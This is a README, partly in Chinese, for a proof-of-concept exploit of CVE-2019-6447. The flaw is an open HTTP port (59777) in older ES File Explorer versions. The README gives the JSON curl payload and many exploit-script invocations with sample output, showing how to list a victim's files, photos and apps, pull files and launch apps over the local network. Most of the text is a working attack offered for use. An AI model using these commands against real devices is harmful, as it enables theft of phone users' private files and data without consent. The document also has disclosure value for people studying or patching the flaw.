# ES File Explorer Open Port Vulnerability - CVE-2019-6447
As per their Google Play description:
> ES文件管理器(文件管理器)是一个功能齐全的文件(图像，音乐，电影，文件，应用程序)管理器，为本地和网络使用!ES File Explorer(文件管理器)在全球拥有超过5亿用户，帮助您高效地管理您的android手机和文件，并在无需数据成本的情况下共享文件。

每次用户启动应用程序时，都会启动一个HTTP服务器。此服务器在本地打开端口59777:
```console
angler:/ # netstat -ap | grep com.estrongs
tcp6       0      0 :::59777                :::*                    LISTEN      5696/com.estrongs.android.pop
```

在这个端口上，攻击者可以向目标发送JSON格式payload
```console
curl --header "Content-Type: application/json" --request POST --data '{"command":"[my_awesome_cmd]"}' http://192.168.0.8:59777
```
这些命令允许攻击者**连接到同一个本地网络上的受害者**，获取大量有关受害者手机的有趣信息(设备信息、安装的应用程序、……)，**远程从受害者手机获取文件**，**远程启动受害者手机上的应用程序**。

## 影响版本
4.1.9.7.4 以下

## POC Features
有了以下的(POC)，你可以:

-列出受害者设备的sdcard中的所有文件
-列出受害者设备上的所有图片
-列出受害者设备中的所有视频
-列出受害者设备中的所有音频文件
-列出受害者设备上安装的所有应用程序
-列出受害者设备上安装的所有系统应用程序
-列出受害者设备上安装的所有手机应用程序
-列出所有储存在受害者设备的sdcard中的apk文件
-列出受害者设备上安装的所有应用程序
-获取受害者设备的设备信息
-从受害设备中提取文件
-启动你选择的应用程序
-获取您选择的应用程序的图标

## Demo
[![Demo](http://img.youtube.com/vi/z6hfgnPNBRE/0.jpg)](http://www.youtube.com/watch?v=z6hfgnPNBRE)

![](https://www.superbed.cn/pic/5c43e1575f3e509ed9437a06)

![](https://www.superbed.cn/pic/5c43de555f3e509ed9436bb7)

## How To
```console
$ python poc.py -g /sdcard/Android/media/com.google.android.talk/Ringtones/hangouts_incoming_call.ogg

$ python poc.py --cmd appPull --pkg com.tencent.mm

$ python poc.py --cmd getAppThumbnail --pkg com.tencent.mm

$ python poc.py --cmd appLaunch --pkg com.tencent.mm
{"result":"0"}

$ python poc.py --cmd getDeviceInfo
{"name":"Nexus 6P", "ftpRoot":"/sdcard", "ftpPort":"3721"}

$ python poc.py --cmd listAppsAll
{"packageName":"com.google.android.carriersetup", "label":"Carrier Setup", "version":"8.1.0", "versionCode":"27", "location":"/system/priv-app/CarrierSetup/CarrierSetup.apk", "size":"2462870", "status":"null", "mTime":"1230796800000"},
{"packageName":"com.android.cts.priv.ctsshim", "label":"com.android.cts.priv.ctsshim", "version":"8.1.0-4396705", "versionCode":"27", "location":"/system/priv-app/CtsShimPrivPrebuilt/CtsShimPrivPrebuilt.apk", "size":"22744", "status":"null", "mTime":"1230796800000"}

$ python poc.py --cmd listAppsPhone
{"packageName":"com.google.android.carriersetup", "label":"Carrier Setup", "version":"8.1.0", "versionCode":"27", "location":"/system/priv-app/CarrierSetup/CarrierSetup.apk", "size":"2462870", "status":"null", "mTime":"1230796800000"}

$ python poc.py --cmd listAppsSystem
{"packageName":"com.google.android.carriersetup", "label":"Carrier Setup", "version":"8.1.0", "versionCode":"27", "location":"/system/priv-app/CarrierSetup/CarrierSetup.apk", "size":"2462870", "status":"null", "mTime":"1230796800000"}

$ python poc.py --cmd listApps
{"packageName":"com.google.android.youtube", "label":"YouTube", "version":"13.50.52", "versionCode":"1350523400", "location":"/data/app/com.google.android.youtube-hg9X1FaylPbUXO1SaiFtkg==/base.apk", "size":"36860368", "status":"com.google.android.apps.youtube.app.application.backup.YouTubeBackupAgent", "mTime":"1545337705957"}

$ python poc.py --cmd listAppsSdcard

$ python poc.py --cmd listAudios
{"name":"hangouts_incoming_call.ogg", "time":"10/17/18 11:33:16 PM", "location":"/storage/emulated/0/Android/media/com.google.android.talk/Ringtones/hangouts_incoming_call.ogg", "duration":5000, "size":"74.63 KB (76,425 Bytes)", }

$ python poc.py --cmd listPics
{"name":"mmexport1546422097497.jpg", "time":"1/2/19 10:41:37 AM", "location":"/storage/emulated/0/tencent/MicroMsg/WeChat/mmexport1546422097497.jpg", "size":"38.80 KB (39,734 Bytes)", }

$ python poc.py --cmd listVideos

$ python poc.py --cmd listFiles

$ python poc.py --cmd listFiles --network 192.168.1.

$ python poc.py list

######################
# Available Commands #
######################
listFiles：列出所有文件
listPics：列出所有图片
listVideos：列出所有视频
listAudios：列出所有音频文件
listApps：列出所有已安装的应用
listAppsSystem：列出所有系统应用
listAppsPhone：列出所有手机应用
listAppsSdcard：列出所有sdcard 
listAppsAll：列出安装的所有应用程序（包括系统应用程序）
getDeviceInfo：获取设备信息
appPull：从设备中提取应用程序。需要包名称参数
appLaunch：启动应用程序。需要包名称参数
getAppThumbnail：获取应用程序的图标。包名称参数是必需的
```

## Contact
Follow me on [Twitter](https://twitter.com/fs0c131y)! You can also find a small part of my work at [https://fs0c131y.com](https://fs0c131y.com)

## Credits
Following a tip from [@moonbocal](https://twitter.com/moonbocal), the investigation and the POC has been made with ❤️ by @fs0c131y
